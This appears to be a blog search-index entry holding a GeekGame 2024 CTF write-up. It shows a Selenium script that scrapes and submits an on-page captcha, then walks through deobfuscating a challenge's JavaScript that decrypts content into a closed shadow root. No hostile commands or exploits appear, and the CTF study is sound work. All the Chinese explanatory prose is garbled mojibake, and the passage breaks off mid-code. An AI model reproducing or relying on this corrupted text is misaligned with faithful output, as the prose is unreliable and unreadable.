<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>GeekGame 2024 WriteUp</title>
    <link href="/2024/10/20/ctf/geekgame2024/"/>
    <url>/2024/10/20/ctf/geekgame2024/</url>
    
    <content type="html"><![CDATA[<p>GeekGame 2024 WriteUpï¼Œè‰°éš¾ä¸”æ›´è‰°éš¾</p><!-- å¸Œæœ›ä»¥åè¿˜æœ‰å‘½å†™ WP --><span id="more"></span><blockquote><p>Rankï¼š0x7f/0x30 ï¼ˆæ‰€æœ‰é€‰æ‰‹/å…¶å®ƒé€‰æ‰‹ï¼‰</p></blockquote><p>åšå‡ºæ¥ä¸€äº›å¨±ä¹å‘çš„é¢˜ç›®ï¼Œç®—æ˜¯ç¼“è§£äº†ä¸€ç‚¹æœ¬æ¥è¦å´©æºƒçš„ç²¾ç¥çŠ¶æ€ã€‚ç„¶åæŠ€æœ¯åŠ›çš„é¢˜ç›®å°±åšå‡ºæ¥å¾ˆå°‘äº†ï¼Œè¿™é‡Œå°±æ”¾ä¸¤é¢˜å§ï¼Œ</p><h2 id="web-copy-hard">web-copy (hard)</h2><p>ä¸ç»™ F12 æ˜¯å§ï¼ŒSelenium ä¸€æŠŠæ¢­ï¼Œæˆ‘ç›´æ¥è¾“å‡º <code>page_source</code>ç„¶å XPATHã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> time<br><br><span class="hljs-keyword">from</span> selenium <span class="hljs-keyword">import</span> webdriver<br><span class="hljs-keyword">from</span> selenium.webdriver.common.by <span class="hljs-keyword">import</span> By<br><br><br>token       = <span class="hljs-string">&quot;&lt;your token&gt;&quot;</span><br>home_url    = <span class="hljs-string">f&quot;https://prob05.geekgame.pku.edu.cn/?token=<span class="hljs-subst">&#123;token&#125;</span>&quot;</span><br><br>browser = webdriver.Edge()<br>browser.get(home_url)<br><br>el = browser.find_element(By.XPATH, <span class="hljs-string">&quot;/html/body/p[4]/a[1]&quot;</span>)<br>el.click()<br><br>els = browser.find_elements(By.XPATH, <span class="hljs-string">&#x27;//div[@id=&quot;centralNoiseContent1&quot;]/div[@class=&quot;noiseLine&quot;]&#x27;</span>)<br>captcha = <span class="hljs-string">&quot;&quot;</span>.join(<span class="hljs-built_in">map</span>(<span class="hljs-keyword">lambda</span> el: el.text, els))<br><br>el_inp = browser.find_element(By.ID, <span class="hljs-string">&quot;noiseInput&quot;</span>)<br>el_btn = browser.find_element(By.ID, <span class="hljs-string">&quot;submitBtn&quot;</span>)<br>el_inp.send_keys(captcha)<br>el_btn.click()<br><br><span class="hljs-built_in">print</span>(browser.page_source)<br>time.sleep(<span class="hljs-number">5</span>)<br>browser.close()<br></code></pre></td></tr></table></figure><h2 id="web-copy-expert">web-copy (expert)</h2><p>è¿˜ä¸ç»™ F12 æ˜¯å§ï¼ŒSeleniumä¸€æŠŠæ¢­ï¼Œå—¯ï¼Ÿå•¥éƒ½æ²¡æœ‰ï¼Ÿ<code>view-source:</code>çœ‹ä¸€çœ¼å‘ç”Ÿä»€ä¹ˆäº‹äº†ã€‚çœ‹åˆ°</p><ol type="1"><li>æœ€ååŠ è½½äº†ä¸€ä¸ª <code>page2.max.js</code>ï¼Œç‚¹å¼€ä¸€çœ‹å…¨æ˜¯<code>_0xffffffff</code> è¿™æ ·çš„å˜é‡ï¼Œå¤§æ¦‚æ˜¯æ··æ·†è¿‡äº†ã€‚</li><li>æœ‰ä¸€ä¸ª <code>id</code> ä¸º <code>root</code>çš„èŠ‚ç‚¹ï¼Œçœ‹èµ·æ¥å†…å®¹åƒæ˜¯åŠ å¯†è¿‡çš„ï¼Œæœç´¢äº†ä¸€ä¸‹å¥½åƒå« FernetåŠ å¯†ï¼Œä½†æ˜¯æ‹–åˆ°èµ›åšå¨å­ä¸€çœ‹è¦å¯†é’¥ï¼Œè¿˜å¾—æ˜¯è¦ç ´è§£ <code>page2.max.js</code>æ–‡ä»¶ã€‚</li></ol><p>å¿ƒé‡Œå¤§è‡´æœ‰ä¸ªæ•°ï¼Œè„šæœ¬é‡Œé¢æŒ‚äº†ä¸€ä¸ª <code>onload</code> ä¾¦æµ‹å™¨ï¼Œç„¶åæŠŠ<code>&lt;div id="root"&gt;&lt;/div&gt;</code>çš„å†…å®¹è§£å¯†ï¼Œæœ€åæŒ‚è½½ä¸Šå»ï¼ˆå…·ä½“æ€ä¹ˆåšåˆ°æ²¡æœ‰èŠ‚ç‚¹çš„ä¸æ¸…æ¥šï¼‰ã€‚é‚£ä¹ˆæ²¡å¾—é€‰ï¼Œå¼€å§‹é€†å‘è¿™ä¸ªæ··æ·†å§ã€‚æœç´¢å…³é”®è¯<strong>jsåæ··æ·†</strong>ã€‚</p><h3 id="æ›²æŠ˜">æ›²æŠ˜</h3><p>çœ‹äº†å¥½ä¹…æ‰¾åˆ°äº†ä¸€ç¯‡<ahref="https://github.com/AlienwareHe/awesome-reverse/blob/main/js/js-obfuscator.md#javascript-obfuscator%E5%8F%8D%E6%B7%B7%E6%B7%86">æ–‡æ¡£</a>ï¼Œå…¶ä¸­ä»‹ç»äº†AST æ··æ·†ï¼Œçœ‹æ¥è¦å•ƒä»£ç æŸ¥é‡å¤§æ€å™¨ AST äº†ã€‚</p><p>ä½†æ˜¯å®é™…ä¸Šé…ç½®äº†å¥½ä¹… babelä¹‹åï¼Œå‘ç°è¯­æ³•æ ‘å¤ªå¤§äº†ï¼Œè¿™è¦æ˜¯ä¸€æ®µæ®µæŠ ï¼Œä¸€å‘¨éƒ½çœ‹ä¸å®Œã€‚è€ƒè™‘åˆ°è¿™é‡Œçš„jsæ–‡ä»¶æ˜¯ä¸€ä¸ªé™æ€æ–‡ä»¶ï¼Œä¸‹è½½ä¸‹æ¥æœ¬åœ°è°ƒè¯•å°±å¥½äº†ï¼Œä½ ä¸è®©æˆ‘F12ï¼Œæˆ‘å¯ä»¥ <code>alert()</code> å‘€ï¼›ä½ ä¸è®©æˆ‘<code>alert()</code>ï¼Œæˆ‘å¯ä»¥ localStorage æˆ–è€…sessionStorageã€‚å¹¶ä¸”ï¼Œè™½ç„¶ç”¨ babelè§£æçš„è¯­æ³•æ ‘éå¸¸åºå¤§ï¼Œä½†æ˜¯å¯¹æ–‡ä»¶è¿˜ç®—æ˜¯æ ¼å¼åŒ–äº†ï¼Œçœ‹èµ·æ¥åƒä¸€ç‚¹jsçš„æ ·å­äº†ã€‚</p><h3 id="åˆ†æ">åˆ†æ</h3><p>å…ˆçœ‹æœ€å</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-variable language_">window</span>[<span class="hljs-title function_">a0_0x35fc87</span>(<span class="hljs-number">0xf21</span>, <span class="hljs-number">0x16b0</span>)] = <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-title function_">a0_0x5b8baf</span>();<br>&#125;;<br></code></pre></td></tr></table></figure><p>ä¸å‡ºæ‰€æ–™ï¼Œå°±æ˜¯ç»™æŸä¸ªä¾¦æµ‹å™¨æŒ‚äº†é’©å­ï¼Œé‚£ä¹ˆå°±ä»<code>a0_0x5b8baf()</code> æ¥åˆ†æã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">a0_0x5b8baf</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">var</span> a0_0x523a18 = &#123;<br>      <span class="hljs-attr">_0x2818de</span>: <span class="hljs-number">0x199a</span>,<br>      <span class="hljs-attr">_0x1a652f</span>: <span class="hljs-number">0x6e6</span>,<br>      <span class="hljs-attr">_0x24d50d</span>: <span class="hljs-number">0xdb8</span>,<br>      <span class="hljs-attr">_0x1879fe</span>: <span class="hljs-number">0xac</span>,<br>      <span class="hljs-attr">_0x2cb4a8</span>: <span class="hljs-number">0xc9e</span>,<br>      <span class="hljs-attr">_0x49173d</span>: <span class="hljs-number">0x19b9</span>,<br>      <span class="hljs-attr">_0x15b636</span>: <span class="hljs-number">0x1609</span>,<br>      <span class="hljs-attr">_0x3e0d99</span>: <span class="hljs-number">0x106f</span>,<br>      <span class="hljs-attr">_0x1aeec6</span>: <span class="hljs-number">0xb05</span>,<br>      <span class="hljs-attr">_0x5e86c5</span>: <span class="hljs-number">0x119a</span>,<br>      <span class="hljs-attr">_0x4b8b9f</span>: <span class="hljs-number">0x1045</span><br>    &#125;,<br>    a0_0x2cad5e = &#123;<br>      <span class="hljs-attr">_0x313ddb</span>: <span class="hljs-number">0x141</span><br>    &#125;,<br>    _0x4eb293 = &#123;<br>      <span class="hljs-string">&#x27;zzUXd&#x27;</span>: <span class="hljs-title function_">_0x358a2f</span>(a0_0x523a18.<span class="hljs-property">_0x2818de</span>, <span class="hljs-number">0x1135</span>),<br>      <span class="hljs-string">&#x27;erBjh&#x27;</span>: <span class="hljs-title function_">_0xe7c12d</span>(<span class="hljs-number">0x300</span>, <span class="hljs-number">0xa11</span>),<br>      <span class="hljs-string">&#x27;QwGoq&#x27;</span>: <span class="hljs-title function_">_0xe7c12d</span>(<span class="hljs-number">0x12d7</span>, a0_0x523a18.<span class="hljs-property">_0x1a652f</span>),<br>      <span class="hljs-string">&#x27;PqqCc&#x27;</span>: <span class="hljs-title function_">_0x4bbdbc</span>(<span class="hljs-number">0xe36</span>, a0_0x523a18.<span class="hljs-property">_0x24d50d</span>),<br>      <span class="hljs-string">&#x27;kQJej&#x27;</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">_0x49aeb9, _0x38ac34, _0xe9eda2</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_">_0x49aeb9</span>(_0x38ac34, _0xe9eda2);<br>      &#125;,<br>      <span class="hljs-string">&#x27;NxUhs&#x27;</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">_0x5574a9, _0xa4b111, _0x3587ae</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_">_0x5574a9</span>(_0xa4b111, _0x3587ae);<br>      &#125;<br>    &#125;;<br>  <span class="hljs-comment">// Tag1</span><br>  <span class="hljs-keyword">const</span> _0x4b819d = <span class="hljs-variable language_">document</span>[<span class="hljs-title function_">_0x358a2f</span>(<span class="hljs-number">0x3c7</span>, a0_0x523a18.<span class="hljs-property">_0x1879fe</span>)](_0x4eb293[<span class="hljs-title function_">_0xe7c12d</span>(a0_0x523a18.<span class="hljs-property">_0x2cb4a8</span>, <span class="hljs-number">0x119c</span>)]),<br>    _0x17cb53 = _0x4b819d[<span class="hljs-title function_">_0x358a2f</span>(a0_0x523a18.<span class="hljs-property">_0x49173d</span>, <span class="hljs-number">0xdfe</span>)];<br>  _0x4b819d[<span class="hljs-title function_">_0xe7c12d</span>(<span class="hljs-number">0x162c</span>, <span class="hljs-number">0x163b</span>)] = <span class="hljs-string">&#x27;&#x27;</span>, _0x4b819d[<span class="hljs-string">&#x27;style&#x27;</span>][<span class="hljs-title function_">_0x4bbdbc</span>(<span class="hljs-number">0xde0</span>, <span class="hljs-number">0xf2f</span>)] = _0x4eb293[<span class="hljs-title function_">_0xe7c12d</span>(a0_0x523a18.<span class="hljs-property">_0x15b636</span>, a0_0x523a18.<span class="hljs-property">_0x3e0d99</span>)];<br>  <span class="hljs-keyword">function</span> <span class="hljs-title function_">_0x4bbdbc</span>(<span class="hljs-params">_0x1a1e15, _0x19ed69</span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_">a0_0x2e32a9</span>(_0x1a1e15, _0x19ed69 - <span class="hljs-number">0x233</span>);<br>  &#125;<br>  <span class="hljs-keyword">var</span> _0x58d552 = &#123;&#125;;<br>  _0x58d552[<span class="hljs-string">&#x27;mode&#x27;</span>] = _0x4eb293[<span class="hljs-title function_">_0xe7c12d</span>(a0_0x523a18.<span class="hljs-property">_0x1aeec6</span>, <span class="hljs-number">0x16c7</span>)];<br>  <span class="hljs-keyword">const</span> _0xab6759 = _0x4b819d[<span class="hljs-string">&#x27;attachShadow&#x27;</span>](_0x58d552), _0x332326 = <span class="hljs-string">&#x27;...&#x27;</span>;<br>  _0xab6759[<span class="hljs-title function_">_0x4bbdbc</span>(<span class="hljs-number">0xf69</span>, <span class="hljs-number">0x119b</span>)] = <span class="hljs-title function_">_0x4bbdbc</span>(-<span class="hljs-number">0x87</span>, <span class="hljs-number">0x106</span>);<br>  <span class="hljs-keyword">const</span> _0x3188da = <span class="hljs-variable language_">document</span>[<span class="hljs-string">&#x27;createElement&#x27;</span>](_0x4eb293[<span class="hljs-string">&#x27;PqqCc&#x27;</span>]);<br>  _0x3188da[<span class="hljs-string">&#x27;textContent&#x27;</span>] = _0x332326, _0xab6759[<span class="hljs-string">&#x27;appendChild&#x27;</span>](_0x3188da);<br>  <span class="hljs-keyword">function</span> <span class="hljs-title function_">_0x358a2f</span>(<span class="hljs-params">_0x1aadd0, _0x497d2c</span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_">a0_0x32746c</span>(_0x497d2c, _0x1aadd0 - <span class="hljs-number">0x24c</span>);<br>  &#125;<br>  [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>].<span class="hljs-title function_">forEach</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">a0_0x504e28</span>(_0xab6759)), _0x4eb293[<span class="hljs-title function_">_0xe7c12d</span>(<span class="hljs-number">0x137f</span>, a0_0x523a18.<span class="hljs-property">_0x4b8b9f</span>)](a0_0x204ab6, _0xab6759, _0x17cb53);<br>  <span class="hljs-keyword">function</span> <span class="hljs-title function_">_0xe7c12d</span>(<span class="hljs-params">_0x5411b3, _0x388f1b</span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_">a0_0x32746c</span>(_0x388f1b, _0x5411b3 - -a0_0x2cad5e.<span class="hljs-property">_0x313ddb</span>);<br>  &#125;<br>  _0x4eb293[<span class="hljs-title function_">_0xe7c12d</span>(<span class="hljs-number">0xbbd</span>, <span class="hljs-number">0x303</span>)](<span class="hljs-built_in">setInterval</span>, <span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">a0_0x504e28</span>(_0xab6759), <span class="hljs-number">0x1</span> * -<span class="hljs-number">0x5e1</span> + -<span class="hljs-number">0x242b</span> + <span class="hljs-number">0x494c</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>çœ‹ä¸Šå»å¥½å“äººï¼Œä½†æ˜¯æˆ‘ä»¬ä¸€è¡Œè¡Œæ¥çœ‹ï¼ˆIDAä¸ä¹Ÿæ˜¯è¿™æ ·ä¹ˆï¼‰ã€‚å‰é¢çš„å˜é‡æš‚æ—¶ä¸çœ‹ï¼Œæˆ‘ä»¬ä¹Ÿä¸çŸ¥é“åˆ°åº•æƒ³è¦å¹²ä»€ä¹ˆï¼Œåæ­£å°±æ˜¯æ‹†å­—ã€‚</p><p>çœ‹ Tag1ï¼Œè¿™é‡Œæœ‰ä¸€ä¸ª <code>document</code> çš„æˆå‘˜å‡½æ•°ï¼Œç”¨<code>alert</code> çœ‹çœ‹<code>_0x358a2f(0x3c7, a0_0x523a18._0x1879fe)</code> å’Œ<code>_0x4eb293[_0xe7c12d(a0_0x523a18._0x2cb4a8, 0x119c)]</code>ã€‚å¾ˆå¥½</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-title function_">_0x358a2f</span>(<span class="hljs-number">0x3c7</span>, a0_0x523a18.<span class="hljs-property">_0x1879fe</span>) = <span class="hljs-string">&quot;getElementById&quot;</span>;<br>_0x4eb293[<span class="hljs-title function_">_0xe7c12d</span>(a0_0x523a18.<span class="hljs-property">_0x2cb4a8</span>, <span class="hljs-number">0x119c</span>)] = <span class="hljs-string">&quot;root&quot;</span>;<br></code></pre></td></tr></table></figure><p>é‚£ä¹ˆæ˜ç™½äº†ï¼Œè¿™é‡Œ<code>const _0x4b819d = document.getElementById("root");</code>ã€‚è¿™ä¸ªå‡ºæ¥äº†ä¹‹åï¼Œåé¢çš„è§£æå°±æœ‰ç‚¹çœ‰ç›®äº†ã€‚ä¸‹é¢æ˜¯å¤§éƒ¨åˆ†è§£æåçš„ç»“æœï¼ˆä»¥æ³¨é‡Šçš„å½¢å¼æ”¾åœ¨è¯­å¥ä¸Šï¼Œæœ‰ç‚¹é•¿ï¼Œè¯·è€å¿ƒè¯»ä¸€è¯»ï¼‰ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">a0_0x5b8baf</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">var</span> a0_0x523a18 = &#123;<br>      <span class="hljs-attr">_0x2818de</span>: <span class="hljs-number">0x199a</span>,<br>      <span class="hljs-attr">_0x1a652f</span>: <span class="hljs-number">0x6e6</span>,<br>      <span class="hljs-attr">_0x24d50d</span>: <span class="hljs-number">0xdb8</span>,<br>      <span class="hljs-attr">_0x1879fe</span>: <span class="hljs-number">0xac</span>,<br>      <span class="hljs-attr">_0x2cb4a8</span>: <span class="hljs-number">0xc9e</span>,<br>      <span class="hljs-attr">_0x49173d</span>: <span class="hljs-number">0x19b9</span>,<br>      <span class="hljs-attr">_0x15b636</span>: <span class="hljs-number">0x1609</span>,<br>      <span class="hljs-attr">_0x3e0d99</span>: <span class="hljs-number">0x106f</span>,<br>      <span class="hljs-attr">_0x1aeec6</span>: <span class="hljs-number">0xb05</span>,<br>      <span class="hljs-attr">_0x5e86c5</span>: <span class="hljs-number">0x119a</span>,<br>      <span class="hljs-attr">_0x4b8b9f</span>: <span class="hljs-number">0x1045</span><br>    &#125;,<br>    a0_0x2cad5e = &#123;<br>      <span class="hljs-attr">_0x313ddb</span>: <span class="hljs-number">0x141</span><br>    &#125;,<br>    _0x4eb293 = &#123;<br>      <span class="hljs-string">&#x27;zzUXd&#x27;</span>: <span class="hljs-title function_">_0x358a2f</span>(a0_0x523a18.<span class="hljs-property">_0x2818de</span>, <span class="hljs-number">0x1135</span>),<br>      <span class="hljs-string">&#x27;erBjh&#x27;</span>: <span class="hljs-title function_">_0xe7c12d</span>(<span class="hljs-number">0x300</span>, <span class="hljs-number">0xa11</span>),<br>      <span class="hljs-string">&#x27;QwGoq&#x27;</span>: <span class="hljs-title function_">_0xe7c12d</span>(<span class="hljs-number">0x12d7</span>, a0_0x523a18.<span class="hljs-property">_0x1a652f</span>),<br>      <span class="hljs-string">&#x27;PqqCc&#x27;</span>: <span class="hljs-title function_">_0x4bbdbc</span>(<span class="hljs-number">0xe36</span>, a0_0x523a18.<span class="hljs-property">_0x24d50d</span>),<br>      <span class="hljs-string">&#x27;kQJej&#x27;</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">_0x49aeb9, _0x38ac34, _0xe9eda2</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_">_0x49aeb9</span>(_0x38ac34, _0xe9eda2);<br>      &#125;,<br>      <span class="hljs-string">&#x27;NxUhs&#x27;</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">_0x5574a9, _0xa4b111, _0x3587ae</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_">_0x5574a9</span>(_0xa4b111, _0x3587ae);<br>      &#125;<br>    &#125;;<br>  <span class="hljs-comment">// _0x358a2f(0x3c7, a0_0x523a18._0x1879fe) = &quot;getElementById&quot;;</span><br>  <span class="hljs-comment">// _0x4eb293[_0xe7c12d(a0_0x523a18._0x2cb4a8, 0x119c)] = &quot;root&quot;;</span><br>  <span class="hljs-comment">// const _0x4b819d = document.getElementById(&quot;root&quot;);</span><br>  <span class="hljs-comment">// const rootEl = _0x4b819d; // è®¾ç½®åˆ«åï¼Œçœ‹å¾—æ¸…æ¥šä¸€ç‚¹ï¼Œä¸‹åŒ</span><br>  <span class="hljs-keyword">const</span> _0x4b819d = <span class="hljs-variable language_">document</span>[<span class="hljs-title function_">_0x358a2f</span>(<span class="hljs-number">0x3c7</span>, a0_0x523a18.<span class="hljs-property">_0x1879fe</span>)](_0x4eb293[<span class="hljs-title function_">_0xe7c12d</span>(a0_0x523a18.<span class="hljs-property">_0x2cb4a8</span>, <span class="hljs-number">0x119c</span>)]),<br>  <span class="hljs-comment">// _0x358a2f(a0_0x523a18._0x49173d, 0xdfe) = &quot;textContent&quot;;</span><br>  <span class="hljs-comment">// _0x17cb53 = rootEl.textContent;</span><br>  <span class="hljs-comment">// const cipherContent = _0x17cb53;</span><br>    _0x17cb53 = _0x4b819d[<span class="hljs-title function_">_0x358a2f</span>(a0_0x523a18.<span class="hljs-property">_0x49173d</span>, <span class="hljs-number">0xdfe</span>)];<br><br>  <span class="hljs-comment">// _0xe7c12d(0x162c, 0x163b) = &quot;innerHTML&quot;;</span><br>  <span class="hljs-comment">// rootEl.innerHTML = &#x27;&#x27;;</span><br>  _0x4b819d[<span class="hljs-title function_">_0xe7c12d</span>(<span class="hljs-number">0x162c</span>, <span class="hljs-number">0x163b</span>)] = <span class="hljs-string">&#x27;&#x27;</span>,<br>  <span class="hljs-comment">// è®¾ç½® styleï¼Œä¸ç®¡</span><br>    _0x4b819d[<span class="hljs-string">&#x27;style&#x27;</span>][<span class="hljs-title function_">_0x4bbdbc</span>(<span class="hljs-number">0xde0</span>, <span class="hljs-number">0xf2f</span>)] = _0x4eb293[<span class="hljs-title function_">_0xe7c12d</span>(a0_0x523a18.<span class="hljs-property">_0x15b636</span>, a0_0x523a18.<span class="hljs-property">_0x3e0d99</span>)];<br><br>  <span class="hljs-keyword">function</span> <span class="hljs-title function_">_0x4bbdbc</span>(<span class="hljs-params">_0x1a1e15, _0x19ed69</span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_">a0_0x2e32a9</span>(_0x1a1e15, _0x19ed69 - <span class="hljs-number">0x233</span>);<br>  &#125;<br><br>  <span class="hljs-keyword">var</span> _0x58d552 = &#123;&#125;;<br>  <span class="hljs-comment">// _0x4eb293[_0xe7c12d(a0_0x523a18._0x1aeec6, 0x16c7)] = &quot;closed&quot;;</span><br>  <span class="hljs-comment">// _0x58d552 = &#123;&#x27;mode&#x27;: &#x27;closed&#x27;&#125;;</span><br>  <span class="hljs-comment">// const opts = _0x58d552;</span><br>  _0x58d552[<span class="hljs-string">&#x27;mode&#x27;</span>] = _0x4eb293[<span class="hljs-title function_">_0xe7c12d</span>(a0_0x523a18.<span class="hljs-property">_0x1aeec6</span>, <span class="hljs-number">0x16c7</span>)];<br><br>  <span class="hljs-comment">// _0xab6759 = rootEl.attachShadow(opts);</span><br>  <span class="hljs-comment">// const shadowRootEl = _0xab6759;</span><br>  <span class="hljs-keyword">const</span> _0xab6759 = _0x4b819d[<span class="hljs-string">&#x27;attachShadow&#x27;</span>](_0x58d552), _0x332326 = <span class="hljs-string">&#x27;...&#x27;</span>;<br><br>  _0xab6759[<span class="hljs-title function_">_0x4bbdbc</span>(<span class="hljs-number">0xf69</span>, <span class="hljs-number">0x119b</span>)] = <span class="hljs-title function_">_0x4bbdbc</span>(-<span class="hljs-number">0x87</span>, <span class="hljs-number">0x106</span>);<br>  <span class="hljs-keyword">const</span> _0x3188da = <span class="hljs-variable language_">document</span>[<span class="hljs-string">&#x27;createElement&#x27;</span>](_0x4eb293[<span class="hljs-string">&#x27;PqqCc&#x27;</span>]);<br>  _0x3188da[<span class="hljs-string">&#x27;textContent&#x27;</span>] = _0x332326, _0xab6759[<span class="hljs-string">&#x27;appendChild&#x27;</span>](_0x3188da);<br>  <span class="hljs-keyword">function</span> <span class="hljs-title function_">_0x358a2f</span>(<span class="hljs-params">_0x1aadd0, _0x497d2c</span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_">a0_0x32746c</span>(_0x497d2c, _0x1aadd0 - <span class="hljs-number">0x24c</span>);<br>  &#125;<br><br>  <span class="hljs-comment">// [0x9*-0x40e+0x5ec+-0x1*-0x1e93,0x3*0x45+0xc16+0xce3*-0x1,-0x11eb*0x1+0x53*0x2c+0x3aa] = [1,2,3]</span><br>  <span class="hljs-comment">// _0x4bbdbc(0xd45,a0_0x523a18._0x5e86c5) = &quot;forEach&quot;</span><br>  <span class="hljs-comment">// [1,2,3].forEach(() =&gt; a0_0x504e28(shadowRootEl));</span><br>  [<span class="hljs-number">0x9</span>*-<span class="hljs-number">0x40e</span>+<span class="hljs-number">0x5ec</span>+-<span class="hljs-number">0x1</span>*-<span class="hljs-number">0x1e93</span>,<span class="hljs-number">0x3</span>*<span class="hljs-number">0x45</span>+<span class="hljs-number">0xc16</span>+<span class="hljs-number">0xce3</span>*-<span class="hljs-number">0x1</span>,-<span class="hljs-number">0x11eb</span>*<span class="hljs-number">0x1</span>+<span class="hljs-number">0x53</span>*<span class="hljs-number">0x2c</span>+<span class="hljs-number">0x3aa</span>][<span class="hljs-title function_">_0x4bbdbc</span>(<span class="hljs-number">0xd45</span>,a0_0x523a18.<span class="hljs-property">_0x5e86c5</span>)](<span class="hljs-function">()=&gt;</span><span class="hljs-title function_">a0_0x504e28</span>(_0xab6759)),<br><br>  <span class="hljs-comment">// è¿™é‡Œè™½ç„¶æ²¡èƒ½è§£æåˆ°å…·ä½“çš„åç§°ï¼Œä½†æ˜¯çœ‹åˆ°æœ€åå‡½æ•°è°ƒç”¨çš„è¿‡ç¨‹ä¸­ shadowRootEl</span><br>  <span class="hljs-comment">// å’Œ cipherContent éƒ½è¢«æ”¾åœ¨äº†ä¸€ä¸ªå‡½æ•°é‡Œé¢ï¼Œå¯ä»¥çŒœæƒ³è¿™é‡Œå¤§æ¦‚å°±æ˜¯è§£å¯†+å†…å®¹æŒ‚è½½äº†ï¼Œ</span><br>  <span class="hljs-comment">// æˆ‘ä»¬åªè¦åœ¨åé¢æˆªèƒ¡å°±å¥½</span><br>    _0x4eb293[<span class="hljs-title function_">_0xe7c12d</span>(<span 